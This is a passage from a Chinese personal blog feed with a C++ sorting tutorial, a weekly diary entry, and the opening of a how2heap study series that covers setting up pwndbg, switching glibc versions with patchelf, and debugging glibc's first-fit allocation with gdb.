是类型参数，代表类型。<br>编译器由模板自动生成函数时，会用具体的类型名对模板中所有的类型参数进行替换，其他部分则原封不动地保留。同一个类型参数只能替换为同一种类型。编译器在编译到调用函数模板的语句时，会根据实参的类型判断该如何替换模板中的类型参数。</p><h1 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h1><p>首先，找到数组中最小的元素，拎出来，将它和数组的第一个元素交换位置，第二步，在剩下的元素中继续寻找最小的元素，拎出来，和数组的第二个元素交换位置，如此循环，直到整个数组排序完成。<br><img src="https://image.hackerjerry.top/%E6%8E%92%E5%BA%8F-1.gif#height=387&id=u26cb77fa&margin=%5Bobject%20Object%5D&originHeight=538&originWidth=955&originalType=binary%E2%88%B6=1&status=done&style=none&width=687"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-keyword">int</span> length = <span class="hljs-keyword">sizeof</span>(num)/<span class="hljs-keyword">sizeof</span>(num[<span class="hljs-number">0</span>]);<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SelectSort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num[],<span class="hljs-keyword">int</span> length)</span></span>&#123;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; length;i++)&#123;<br>        <span class="hljs-keyword">int</span> min = i;<span class="hljs-comment">//只需要记录最小值的位置即可！</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = i+<span class="hljs-number">1</span>; j &lt; length;j++)&#123;<br>            <span class="hljs-keyword">if</span> (num[min] &gt; num[j])&#123;<br>                min = j;<span class="hljs-comment">//更新最小位置</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(i!=min)&#123;<br>            <span class="hljs-keyword">int</span> temp = num[min];<br>            num[min] = num[i];<br>            num[i] = temp;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>双层循环，时间复杂度和冒泡一模一样，都是 O(n2)。</p><p>#</p><h1 id="STL-库函数-sort"><a href="#STL-库函数-sort" class="headerlink" title="STL 库函数 sort"></a>STL 库函数 sort</h1><p>编写 C++经常需要使用 sort 进行排序，有可能是简单的数组、数字 vector 或者是复杂一点的存放对象的 vector。<br>C++为了满足用户的需求，在 algorithm 里面封装了 sort 泛型算法。所以使用时，必须<code>#include &lt; algorithm&gt;</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RandomAccessIterator</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">void</span> <span class="hljs-title">sort</span> (<span class="hljs-title">RandomAccessIterator</span> <span class="hljs-title">first</span>, <span class="hljs-title">RandomAccessIterator</span> <span class="hljs-title">last</span>);</span><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RandomAccessIterator</span>, <span class="hljs-title">class</span> <span class="hljs-title">Compare</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">void</span> <span class="hljs-title">sort</span> (<span class="hljs-title">RandomAccessIterator</span> <span class="hljs-title">first</span>, <span class="hljs-title">RandomAccessIterator</span> <span class="hljs-title">last</span>, <span class="hljs-title">Compare</span> <span class="hljs-title">comp</span>);</span><br></code></pre></td></tr></table></figure><p>可以看见，sort 原型分为两个，区别在于第一个函数有两个参数，第一个函数有三个参数。<br>其中两个函数都有的是 <code>RandomAccessIterator</code> 是随机访问迭代器，first 是初始位置，last 是末尾位置，默认使用迭代器引用的 <code>operator &lt; </code>进行排序。<br>第二个函数，前两个参数一样，也是用来说明从哪儿到哪儿排序。第三个参数是<code>Compare</code>，意思是使用 comp 这个“方法”对对象进行排序。<code>comp</code>可以是函数对象或者是函数指针。</p><h2 id="默认情况"><a href="#默认情况" class="headerlink" title="默认情况"></a>默认情况</h2><ul><li>两个参数</li></ul><p>使用两个参数这应该是最普遍也是最简单的情景，如果只有两个参数，默认使用 operator &lt; 对数组排序，结果为<strong>升序</strong>。</p><h3 id="对数组排序"><a href="#对数组排序" class="headerlink" title="对数组排序"></a>对数组排序</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> arr[] = &#123; <span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span> &#125;;<br>sort(arr, arr + <span class="hljs-number">9</span>);<br></code></pre></td></tr></table></figure><p>需要注意的是，这里传入的是迭代器，所以要传入头指针和末尾指针（最后一个待排元素的后一个位置）,数组的话，变量名就是起始地址。</p><h3 id="对-vector-排序"><a href="#对-vector-排序" class="headerlink" title="对 vector 排序"></a>对 vector 排序</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; arr;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">9</span>;i &gt;<span class="hljs-number">0</span>;i--)&#123;<br>    arr.push_back(i);<br>&#125;<br>sort(arr.begin(),arr.end());<br></code></pre></td></tr></table></figure><p>这里直接传入 vector 的 begin 和 end 两个迭代器就对整个 vector 完成了排序。</p><h3 id="对对象排序"><a href="#对对象排序" class="headerlink" title="对对象排序"></a>对对象排序</h3><p>如果<strong>只使用两个参数的话</strong>，要对对象排序，那么<strong>只能依靠重载运算符</strong>来实现。而且必须<strong>重载的是 &lt; 关系运算符</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">int</span> value;<br>    Test() : value(<span class="hljs-number">0</span>) &#123;&#125;;<br>    Test(<span class="hljs-keyword">int</span> x) : value(x) &#123;&#125;;<br><br>    <span class="hljs-comment">// 重载运算符</span><br>    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span> &lt; (<span class="hljs-keyword">const</span> Test&amp; t) &#123;<br>        <span class="hljs-keyword">if</span> (value &lt; t.value)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br><span class="hljs-built_in">vector</span>&lt;Test&gt; arr;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">9</span>; i &gt; <span class="hljs-number">0</span>; i--) &#123;<br>    arr.push_back(Test(i));<br>&#125;<br>sort(arr.begin(), arr.end());<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i =<span class="hljs-number">0</span>;i&lt;arr.size();i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,arr[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样，就根据 Test 类中 value 的值来升序排对象的顺序了。</p><h3 id="三个参数排序"><a href="#三个参数排序" class="headerlink" title="三个参数排序"></a>三个参数排序</h3><p>先不写了</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ol><li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MzYzMDAwNw==%E2%88%A3=2247486587&idx=1&sn=7becbafba2658a4c6bf901ee65dd5277&chksm=ec6e7523db19fc358cdaac6686d4d4c5c36309b69352c33f71ece38b90fef50394a5c004cb84&mpshare=1&scene=1&srcid=">https://mp.weixin.qq.com/s?__biz=MzI5MzYzMDAwNw==∣=2247486587&amp;idx=1&amp;sn=7becbafba2658a4c6bf901ee65dd5277&amp;chksm=ec6e7523db19fc358cdaac6686d4d4c5c36309b69352c33f71ece38b90fef50394a5c004cb84&amp;mpshare=1&amp;scene=1&amp;srcid=</a></li><li>视频 | 手撕九大经典排序算法，看我就够了！ - 力扣（LeetCode）的文章 - 知乎 <a href="https://zhuanlan.zhihu.com/p/52884590">https://zhuanlan.zhihu.com/p/52884590</a></li><li><a href="https://blog.csdn.net/qq_46018418/article/details/106341404">https://blog.csdn.net/qq_46018418/article/details/106341404</a></li><li><a href="https://www.cnblogs.com/scyq/p/13053177.html">https://www.cnblogs.com/scyq/p/13053177.html</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;把各类排序做一遍梳理。&lt;/p&gt;</summary>
    
    
    
    <category term="PAT" scheme="https://www.blog.hackerjerry.top/categories/PAT/"/>
    
    
  </entry>
  
  <entry>
    <title>生活周报-June-14-to-20</title>
    <link href="https://www.blog.hackerjerry.top/2021/06/17/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-14-to-20_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/06/17/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-14-to-20_new/</id>
    <published>2021-06-17T09:19:24.000Z</published>
    <updated>2021-11-14T09:17:39.216Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>神州十二号发射成功</li><li>翻译泰斗许渊冲逝世，享年 100 岁</li><li>中国人首次进入自己的国际空间站</li><li>回形针被爆员工和美国军方有利益往来。</li></ol><p>​</p><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>最近的大作业、实验好多，快要撑不住了。</li><li>最近的夏令营好多，好紧张。</li><li>端午节收到了小雷的粽子，第一次吃咸粽子！一个云腿的一个菌子的，好下饭！</li><li>前一阵子气温很高（接近 40 度），然后这个周下了一周的雨。</li><li>最近掉头发有点多了，从今天，6.17，周四起，11：45 上床，不管还有什么任务没有完成，上床睡觉！</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ol><li><a href="https://www.cnblogs.com/aspirant/p/8902285.html">HashMap, HashTable，HashSet,TreeMap 的时间复杂度 注意数组链表 增删改查的时间复杂度都不相同(阿里)</a></li><li><a href="https://www.jianshu.com/p/7495fad83877">哈希表详解</a></li><li><a href="https://blog.csdn.net/hguisu/article/details/7880288">海量数据处理算法—Bit-Map</a></li><li><a href="http://www.ruanyifeng.com/blog/2015/06/poisson-distribution.html">泊松分布和指数分布</a></li><li><a href="http://www.ruanyifeng.com/blog/2018/09/hash-collision-and-birthday-attack.html">哈希碰撞与生日攻击</a></li></ol><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><p>《觉醒年代》<br>《我的青铜时代 x 罗翔》<br>《我的青铜时代 x 陈佩斯》</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><p>下面是许渊冲许老爷子的一些话，人生哲理，愿君谨记：</p><ol><li><strong>生命不是你活过了多少日子，而是你记住了多少日子。我不管活多久，认真享受每一天，做自己喜欢的事情就好。</strong></li><li><strong>不要与人争，找到自己的热爱。</strong></li></ol><hr><ol start="3"><li>最好的爱是两个人彼此做个伴，不要束缚，不要缠绕，不要占有，不要渴望从对方的身上挖掘到意义，而应该是我们两个人并排坐在一起，看看这个落寞的人间。</li><li>林徽因的<em>《别丢掉》</em></li></ol><p>别丢掉这一把过往的热情，<br>现在流水似的，<br>轻轻在幽冷的山泉底，<br>在黑夜，在松林，<br>叹息似的渺茫，<br>你仍要保存着那真！<br>一样是明月，一样是隔山灯火，<br>满天的星，<br>只有人不见，<br>梦似的挂起，<br>你向黑夜要回那一句话——你仍得相信山谷中留着那回音！</p><ol start="5"><li>人生很长，被人喜欢这件事，我不赶时间。</li></ol><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>生成对抗网络 GAN</li><li>深度卷积神经网络进行虚假人脸识别-分别采用 MTCNN 架构、ResNet50 进行迁移学习</li><li>用 kali 进行无线安全实验，注意内置网卡无法识别，必须使用外置的无线网卡。</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>许渊冲先生千古，他为世人留下了上百本译本。这是一位值得我一生去学习的先生、长者。<br>​</p><p>他天资聪颖，17 岁便入西南联大读书，文学造诣首屈一指。然而他却没有就此懈怠，反而一生笔耕不辍，为世人留下上百本传世佳品。<br>​</p><p>62 岁，老先生以“一年至少新译一本名著、出一本论文集、写一本散文集”的速度，酣畅创造。<br>​</p><p>86 岁，他被诊断患直肠癌，医生说，他最多只有 7 年时间。他反而照旧抓紧一切时间，翻译诗词和名著。试想，此般精神，几人能有？那是死亡的宣判啊，但许老爷子害怕了吗？抱怨了吗？放弃希望了吗？不，他没有，那团生命之火，还在尽情的燃烧着，只要希望不死，人就能拥有活下去的勇气。这难道不令人振奋吗，这难道不令人动容吗？把生命融入到自己的热爱里，即使是上天也会为之感动，许老活了下来，坚强的，用生命去创造。<br>​</p><p>90 岁高龄，他给自己制定的计划是“每天翻译 1000 字”，93 岁，他的工作目标是，翻译完莎士比亚全集，96 岁，他居然骑车出门赏月！不慎摔伤骨折，老先生依然云淡风轻，“要不是为了走这美的路，我就不会摔了，不过月光如水，还摔的挺美的”。<br>​</p><p>人生百年，先生活得精彩。<br>​</p><p>先生的人生态度，值得我一生学习：<br>​</p><p>生老病死，世事浮沉，无改天真与疯狂。<br>​</p><p>“越向前走，越有光明的前途，每一个小时，都要快快活活。”<br>​</p><p>许老爷子一路走好。<br>​</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;神州十二号发射成功&lt;/li&gt;
&lt;li&gt;翻译泰斗许渊冲逝世，享年 100 岁&lt;/li&gt;
&lt;li&gt;中国人首次进入自己的国际空间站&lt;/</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>How2heap系列</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/31/How2heap%E7%B3%BB%E5%88%97_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/31/How2heap%E7%B3%BB%E5%88%97_new/</id>
    <published>2021-05-31T03:51:02.000Z</published>
    <updated>2021-11-14T09:15:18.776Z</updated>
    
    <content type="html"><![CDATA[<p>tags: []<br>categories: []<br>cover: “”<br>​</p><hr><p>实验使用 wsl 进行，具体的 glibc 版本为 2.28，运行<code>/lib/x86_64-linux-gnu/libc.so.6</code>即可看到版本<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-1.png#clientId=u347f053a-7aac-4&from=paste&height=121&id=ubcbe185e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=241&originWidth=756&originalType=binary&size=264115&status=done&style=none&taskId=u396bde25-eab2-4a06-bb3b-c2811987e8d&width=378" alt="image.png"></p><a id="more"></a><h1 id="安装-pwngdb-pwndbg"><a href="#安装-pwngdb-pwndbg" class="headerlink" title="安装 pwngdb+pwndbg"></a>安装 pwngdb+pwndbg</h1><p>参考<a href="https://blog.csdn.net/weixin_43092232/article/details/105648769">https://blog.csdn.net/weixin_43092232/article/details/105648769</a><br>配置如下<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-2.png#clientId=u347f053a-7aac-4&from=paste&height=181&id=udbe3c4f1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=362&originWidth=534&originalType=binary&size=278719&status=done&style=none&taskId=u86b81336-450f-40db-a685-ef4ce0a2429&width=267" alt="image.png"></p><h1 id="how2heap-概述"><a href="#how2heap-概述" class="headerlink" title="how2heap 概述"></a>how2heap 概述</h1><p><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-3.png#clientId=u347f053a-7aac-4&from=paste&height=328&id=u094da593&margin=%5Bobject%20Object%5D&name=image.png&originHeight=656&originWidth=1195&originalType=binary&size=115449&status=done&style=none&taskId=ua9828c89-666f-4095-af6d-4a8310c5693&width=597.5" alt="image.png"><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-4.png#clientId=u347f053a-7aac-4&from=paste&height=357&id=ued1b9be3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=714&originWidth=1202&originalType=binary&size=131426&status=done&style=none&taskId=u62e23b01-92b3-4bf2-9bf4-b40d8099d96&width=601" alt="image.png"><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-5.png#clientId=u347f053a-7aac-4&from=paste&height=324&id=udf398312&margin=%5Bobject%20Object%5D&name=image.png&originHeight=648&originWidth=1206&originalType=binary&size=141433&status=done&style=none&taskId=ueb73bcb6-30ef-4add-ac3a-64f6fa81b36&width=603" alt="image.png"><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-6.png#clientId=u347f053a-7aac-4&from=paste&height=89&id=uca37f774&margin=%5Bobject%20Object%5D&name=image.png&originHeight=178&originWidth=1199&originalType=binary&size=41410&status=done&style=none&taskId=u510b02f8-c5d4-432b-a698-2fe503733f1&width=599.5" alt="image.png"></p><h1 id="切换-glibc-版本"><a href="#切换-glibc-版本" class="headerlink" title="切换 glibc 版本"></a>切换 glibc 版本</h1><p>不到万不得已，不用<code>apt-get install libc-bin=2.24-11+deb9u1 libc6=2.24-11+deb9u1</code></p><blockquote><p>这个版本是通过</p></blockquote><p>glibc 是动态链接库<br>所以可以指定程序的任意 glibc 版本哦，ubuntu 的 glibc-all-in-one 也可以直接用在 debian 上的！<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-7.png#clientId=u347f053a-7aac-4&from=paste&height=238&id=u630ec27f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=476&originWidth=1052&originalType=binary&size=450517&status=done&style=none&taskId=u55f4ef69-a967-440a-977e-c93ae10ee37&width=526" alt="image.png"><br>然后参考<br><a href="https://blog.csdn.net/qq_45595732/article/details/115385790">https://blog.csdn.net/qq_45595732/article/details/115385790</a><br><a href="https://www.yuque.com/kaleido76/pwn/fn4432">https://www.yuque.com/kaleido76/pwn/fn4432</a><br><a href="https://blog.csdn.net/juluwangriyue/article/details/108617283">https://blog.csdn.net/juluwangriyue/article/details/108617283</a><br>并运行类似<br><code>patchelf --set-interpreter /mnt/f/桌面/大三下/软件安全/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so overlapping1</code></p><p><code>patchelf --set-rpath /mnt/f/桌面/大三下/软件安全/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 overlapping1 </code><br>​</p><p>大功告成<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-8.png#clientId=u347f053a-7aac-4&from=paste&height=175&id=ud788b965&margin=%5Bobject%20Object%5D&name=image.png&originHeight=349&originWidth=1285&originalType=binary&size=367384&status=done&style=none&taskId=u5b431fbb-b35d-4966-ad37-114dee52ab6&width=642.5" alt="image.png"></p><h1 id="first-fit-2-28"><a href="#first-fit-2-28" class="headerlink" title="first_fit-2.28"></a>first_fit-2.28</h1><p>这里没有任何攻击，说的是 glibc 分配内存的方式是最先适应算法，空闲块按地址递增的顺序排列，只要求分配空间大小小于该空闲空间大小，就可以分配。实例中给了分配两个 chunk，大小分别为 512 和 256，大于 fastbin，然后写入数据并释放第一个 512chunk，释放的 chunk 在 unsorted bin 之中，之后再分配 500 字节。此时由于 glibc 机制，直接在 unsorted bin 中找到并将其分割，一部分给用户，另一部分保留，所以第三个 chunk 指针与之前第一个 chunk 的相同。<br>我们首先编译<code>gcc first_fit.c -o first -g</code><br>然后<code>gdb first</code>进行调试<br>首先，输入 start<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-9.png#clientId=u347f053a-7aac-4&from=paste&height=345&id=ud7ff854b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=651&originWidth=1122&originalType=binary&size=1125083&status=done&style=none&taskId=u865c97c4-9a62-4c88-9ec7-fb5a1836f15&width=595" alt="image.png"><br>然后查看堆内存<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-10.png#clientId=u347f053a-7aac-4&from=paste&height=56&id=ua939020c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=85&originWidth=393&originalType=binary&size=47039&status=done&style=none&taskId=u8d8fb7a1-4131-4495-a082-a96510f4dc6&width=259.5" alt="image.png"><br>可以看到还是没有的<br>然后 n 单步运行过 13 行，再次运行 heap，可以看到<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-11.png#clientId=u347f053a-7aac-4&from=paste&height=439&id=udab41a45&margin=%5Bobject%20Object%5D&name=image.png&originHeight=878&originWidth=1160&originalType=binary&size=1557884&status=done&style=none&taskId=u232dd3dc-7d9b-4606-9589-d112211794b&width=580" alt="image.png"><br>即第一个 a 的地址就是 0x8005250，然后我们继续分配 b<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-12.png#clientId=u347f053a-7aac-4&from=paste&height=222&id=uf4233992&margin=%5Bobject%20Object%5D&name=image.png&originHeight=443&originWidth=501&originalType=binary&size=323156&status=done&style=none&taskId=u60f56a96-0f5d-4938-80fd-aa9847763cb&width=250.5" alt="image.png"><br>可以发现 b 的地址是 0x8005770<br>而输出的数据是：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-13.png#clientId=u347f053a-7aac-4&from=paste&height=29&id=u0a63667d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=57&originWidth=321&originalType=binary&size=26195&status=done&style=none&taskId=u605230af-8d93-4b13-b34e-467e78437e4&width=160.5" alt="image.png"><br>这是因为我们知道 chunk 指针返回的是 mem 数据部分，chunk 在使用时的数据结构如下图：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp">    An allocated chunk looks like <span class="hljs-keyword">this</span>:<br>    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             Size of previous chunk, if unallocated (P clear)  |<br>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             Size of chunk, in bytes                     |A|M|P|<br>      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             User data starts here...                          .<br>    .                                                               .<br>    .             (malloc_usable_size() bytes)                      .<br>    .                                                               |<br>nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             (size of chunk, but used <span class="hljs-keyword">for</span> application data)    |<br>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             Size of next chunk, in bytes                |A|<span class="hljs-number">0</span>|<span class="hljs-number">1</span>|<br>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br><br></code></pre></td></tr></table></figure><p>其中 chunk 定义的结构体如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      mchunk_size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><p>每个字段的具体的解释如下</p><ul><li><strong>prev_size</strong>, 如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。**这里的前一 chunk 指的是较低地址的 chunk **。</li><li><strong>size</strong> ，该 chunk 的大小，大小必须是 2 _ SIZE_SZ 的整数倍。如果申请的内存大小不是 2 _ SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示<ul><li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li><li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li><li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li></ul></li><li><strong>fd，bk</strong>。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下<ul><li>fd 指向下一个（非物理相邻）空闲的 chunk</li><li>bk 指向上一个（非物理相邻）空闲的 chunk</li><li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li></ul></li><li><strong>fd_nextsize， bk_nextsize</strong>，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul><li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li></ul></li></ul><p>也就是说 malloc 返回的指针就是 chunk 的 fd 指针处，返回内存指针地址-0x10 是 chunk 块的真正头部。<br>这个时候我们可以查看以下两个 chunk 的结构：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-14.png#clientId=u347f053a-7aac-4&from=paste&height=39&id=u3578e819&margin=%5Bobject%20Object%5D&name=image.png&originHeight=78&originWidth=568&originalType=binary&size=60756&status=done&style=none&taskId=ud82be738-496f-4ff0-8b81-3c5a2fd229c&width=284" alt="image.png"><br>验证了我们的想法</p><blockquote><p>GDB 调试查看 Chunk 内存的时候，在 32 